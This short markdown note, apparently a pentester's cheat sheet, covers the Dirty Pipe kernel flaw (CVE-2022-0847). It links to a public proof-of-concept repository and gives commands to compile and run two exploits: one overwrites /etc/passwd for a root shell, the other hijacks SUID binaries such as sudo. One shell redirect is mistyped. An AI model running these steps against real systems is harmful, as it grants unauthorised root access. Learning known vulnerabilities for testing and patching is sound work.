[Dirty Pipe](https://dirtypipe.cm4all.com/) ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)), in kernel allows `unauth` writing to root user files.
The vulnerability is similar to the [Dirty Cow](https://dirtycow.ninja/) discovered in 2016. [PoC](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits).

---
## Exploit Uno

```sh
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
```

 The first exploit (`exploit-1`) modifies the `/etc/passwd` and gives us a prompt with root privileges. For this,verify the kernel version and then execute the exploit.

---
## Exploit Dos

```sh
find / -type f -perm -4000 2?/dev/null ### finding binaries with SUID

./exploit-2 /usr/bin/sudo ### must give full paths
```

With the help of the 2nd exploit version (`exploit-2`), we can execute SUID binaries with root privileges.

---